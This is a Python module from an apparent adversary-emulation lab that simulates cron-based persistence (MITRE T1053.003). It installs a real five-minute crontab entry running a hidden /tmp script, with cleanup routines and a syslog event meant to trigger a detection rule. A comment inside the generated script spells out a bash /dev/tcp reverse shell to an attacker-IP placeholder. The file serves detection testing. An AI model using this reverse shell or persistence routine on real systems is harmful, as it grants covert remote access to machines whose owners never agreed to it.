"""
campaigns/persistence/cron_backdoor.py — T1053.003 Scheduled Task/Job: Cron
MITRE ATT&CK: T1053.003 | Tactic: Persistence
"""

import json
import os
import subprocess
from datetime import UTC, datetime

from campaigns.base_campaign import BaseCampaign


class CronBackdoorCampaign(BaseCampaign):
    TECHNIQUE_ID = "T1053.003"
    TECHNIQUE_NAME = "Scheduled Task/Job: Cron"
    TACTIC = "Persistence"

    C2_IP = os.environ.get("ATTACKER_IP", "172.20.0.10")
    C2_PORT = os.environ.get("C2_PORT", "4444")

    # OQ-1: paths this campaign writes to. Read by runner.py --cleanup-all
    # so cleanup works without a preceding run() call.
    WELL_KNOWN_ARTIFACTS = (
        "/tmp/.lab_beacon.sh",
        "/tmp/lab_beacon_simulated.sh",
        "/tmp/lab_beacon.log",
    )

    def run(self) -> dict:
        self.log_step("init", "Installing cron-based persistence backdoor")
        self.simulate_delay(1)

        # Step 1: Create beacon script
        script_path = self._create_beacon_script()
        self.log_step("beacon_created", f"Beacon script at: {script_path}")
        self.simulate_delay(0.5)

        # Step 2: Install cron job
        cron_result = self._install_cron(script_path)
        self.log_step(
            "cron_install", f"Cron install: {cron_result['status']}", cron_result["status"]
        )
        self.simulate_delay(0.5)

        # Step 3: Verify persistence
        verify = self._verify_cron()
        self.log_step("verify", f"Verification: {verify}")

        results = {
            "technique": self.TECHNIQUE_ID,
            "beacon_script": script_path,
            "cron_entry": f"*/5 * * * * {script_path}",
            "c2": f"{self.C2_IP}:{self.C2_PORT}",
            "install_result": cron_result,
            "timestamp": datetime.now(UTC).isoformat(),
        }
        self.save_artifact("cron_backdoor_results.json", json.dumps(results, indent=2))
        # audit-4 G2b: syslog advisory so persistence_cron.yml has a live
        # doc to match -- the rule's logsource was already `syslog` but no
        # campaign ever shipped a cron event to logstash:5514.
        self.emit_syslog_advisory(
            {
                "signature": "cron_backdoor_simulation",
                "cron_action": "crontab -e",
                "entry": f"*/5 * * * * bash -i {script_path}",
                "beacon_script": script_path,
                "technique": self.TECHNIQUE_ID,
            },
            program="aib-cron",
        )
        return self.build_result(True, "Cron persistence demonstrated (simulation)")

    def _create_beacon_script(self) -> str:
        script = f"""#!/bin/bash
# LAB SIMULATION — T1053.003 Cron Backdoor
# This is a benign educational script. No real C2 communication.
echo "[$(date)] LAB beacon ping to {self.C2_IP}:{self.C2_PORT}" >> /tmp/lab_beacon.log
# In a real attack: bash -i >& /dev/tcp/{self.C2_IP}/{self.C2_PORT} 0>&1
"""
        path = "/tmp/.lab_beacon.sh"
        try:
            with open(path, "w") as f:
                f.write(script)
            os.chmod(path, 0o755)
        except Exception:
            path = "/tmp/lab_beacon_simulated.sh"
        # OQ-1: register both the script and the log it produces for cleanup.
        self.register_cleanup_path(path)
        self.register_cleanup_path("/tmp/lab_beacon.log")
        return path

    def _install_cron(self, script_path: str) -> dict:
        cron_entry = f"*/5 * * * * {script_path}\n"
        try:
            result = subprocess.run(["crontab", "-l"], capture_output=True, text=True, timeout=5)
            current = result.stdout if result.returncode == 0 else ""
            if script_path not in current:
                new_cron = current + cron_entry
                subprocess.run(
                    ["crontab", "-"], input=new_cron, capture_output=True, text=True, timeout=5
                )
                return {"status": "installed", "entry": cron_entry.strip()}
            return {"status": "already_present", "entry": cron_entry.strip()}
        except Exception:
            return {
                "status": "simulated",
                "entry": cron_entry.strip(),
                "note": "crontab not available in this context",
            }

    def _verify_cron(self) -> list:
        try:
            result = subprocess.run(["crontab", "-l"], capture_output=True, text=True, timeout=5)
            return result.stdout.splitlines()
        except Exception:
            return ["(simulated) */5 * * * * /tmp/.lab_beacon.sh"]

    def cleanup(self) -> dict:
        """OQ-1: remove crontab entry plus the registered beacon script/log."""
        result = super().cleanup()  # delete beacon script + log
        cron_status = "skipped"
        try:
            current = subprocess.run(["crontab", "-l"], capture_output=True, text=True, timeout=5)
            if current.returncode == 0 and "lab_beacon" in current.stdout:
                purged = "\n".join(
                    line for line in current.stdout.splitlines() if "lab_beacon" not in line
                )
                if purged and not purged.endswith("\n"):
                    purged += "\n"
                subprocess.run(
                    ["crontab", "-"],
                    input=purged or "",
                    capture_output=True,
                    text=True,
                    timeout=5,
                )
                cron_status = "removed"
            elif current.returncode == 0:
                cron_status = "absent"
        except Exception as exc:
            result["errors"].append({"path": "crontab", "error": str(exc)})
            cron_status = "error"
        result["crontab"] = cron_status
        return result
